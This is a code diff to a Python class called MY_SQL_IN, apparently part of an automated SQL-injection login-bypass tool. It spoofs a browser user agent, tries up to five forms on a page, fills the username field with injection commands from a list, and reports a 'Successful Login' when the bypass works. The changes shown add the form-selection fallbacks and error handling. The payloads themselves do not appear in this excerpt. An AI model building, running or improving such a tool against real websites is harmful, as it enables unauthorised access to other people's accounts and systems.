@@ -33,8 +33,24 @@ class MY_SQL_IN:
                  request.set_handle_redirect(True)
                  request.set_handle_refresh(True, max_time=1)
                  request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-                 Get_Oregnal_URL = request.open(url).read()                
-                 request.select_form(nr = 0)
+                 Get_Oregnal_URL = request.open(url).read()   
+                 try:             
+                    request.select_form(nr = 0)
+                 except Exception :
+                      try:
+                         request.select_form(nr = 1) 
+                      except Exception :   
+                           try:
+                              request.select_form(nr = 2)
+                           except Exception : 
+                                try:
+                                  request.select_form(nr = 3)
+                                except Exception :   
+                                    try:
+                                      request.select_form(nr = 4)
+                                    except Exception :    
+                                        print("[!] NO Form Found HTML  ")
+                                        exit()
                  if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                  and not self.args.UserInput and not self.args.PassInput:
                        request["username"] = f'{command}'
@@ -117,6 +133,7 @@ class MY_SQL_IN:
                      sys.stdout.write('\x1b[2K') 
                      sys.stdout.write('\x1b[1A')
                      sys.stdout.write('\x1b[2K')
+                    
                  else: # print('[+] Username['+'{:<6}'.format(self.args.UserForm) +"] :"+f'{ command}')
                       print('\n[*] Login URL  : ',  passlogin)
                       print('[*] SLQ Injaction Successful  Login ')
@@ -186,10 +203,10 @@ class MY_SQL_IN:
              print('[!] Web May Not Vulnerable To SQL Injaction ')
              print('[*] Saugger To Use anther list Command ')  
          except urllib.error.URLError:
-                  print("[*] Bad URL Connection refused")
-                  exit()
-         #except Exception as a :
-          #         print( "[#] Error : ",a )
+                 print("[*] Bad URL Connection refused")
+                 exit()
+         except Exception as a :
+                print( "[#] Error : ",a )
          except KeyboardInterrupt:
               exit()
        
